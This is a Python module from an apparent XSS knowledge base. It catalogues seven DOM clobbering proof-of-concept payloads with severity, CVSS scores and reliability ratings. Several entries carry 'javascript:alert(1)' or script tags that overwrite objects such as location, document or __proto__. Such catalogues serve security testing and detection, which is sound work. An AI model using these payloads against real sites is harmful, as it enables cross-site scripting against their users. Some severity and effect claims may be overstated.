#!/usr/bin/env python3
"""
Project: BRS-KB (BRS XSS Knowledge Base)
Company: EasyProTech LLC (www.easypro.tech)
Dev: Brabus
Date: 2025-12-26 UTC
Status: Refactored
Telegram: https://t.me/EasyProTech

DOM Clobbering Payloads
"""

from ..models import PayloadEntry


DOM_CLOBBERING_PAYLOADS = {
    "clobber_1": PayloadEntry(
        payload='<form id="x"><input id="y"></form><form id="x"><input id="y">',
        contexts=["html_content"],
        severity="medium",
        cvss_score=6.5,
        description="HTMLCollection clobbering",
        tags=["dom-clobbering", "form", "htmlcollection"],
        reliability="high",
    ),
    "clobber_2": PayloadEntry(
        payload="<img name=x><img id=x name=y><script>alert(x.y)</script>",
        contexts=["html_content"],
        severity="high",
        cvss_score=7.0,
        description="Named element clobbering",
        tags=["dom-clobbering", "img", "named-access"],
        reliability="high",
    ),
    "clobber_3": PayloadEntry(
        payload="<a id=defaultView><a id=defaultView name=alert href=1>",
        contexts=["html_content"],
        severity="high",
        cvss_score=7.5,
        description="defaultView clobbering",
        tags=["dom-clobbering", "defaultView", "window"],
        reliability="medium",
    ),
    "clobber_4": PayloadEntry(
        payload="<form id=document><img id=cookie name=cookie value=x>",
        contexts=["html_content"],
        severity="high",
        cvss_score=7.5,
        description="document.cookie clobbering",
        tags=["dom-clobbering", "document", "cookie"],
        reliability="medium",
    ),
    "clobber_5": PayloadEntry(
        payload='<form><input name="action" value="javascript:alert(1)">',
        contexts=["html_content"],
        severity="high",
        cvss_score=7.5,
        description="Form action clobbering",
        tags=["dom-clobbering", "form", "action"],
        reliability="high",
    ),
    "clobber_6": PayloadEntry(
        payload='<a id=location href="javascript:alert(1)">',
        contexts=["html_content"],
        severity="critical",
        cvss_score=8.5,
        description="window.location clobbering",
        tags=["dom-clobbering", "location", "anchor"],
        reliability="medium",
    ),
    "clobber_7": PayloadEntry(
        payload='<base id=__proto__><a id=__proto__ name=href href="javascript:alert(1)">',
        contexts=["html_content"],
        severity="critical",
        cvss_score=8.5,
        description="Prototype pollution via DOM clobbering",
        tags=["dom-clobbering", "prototype", "__proto__"],
        reliability="low",
    ),
}

DOM_CLOBBERING_PAYLOADS_TOTAL = len(DOM_CLOBBERING_PAYLOADS)
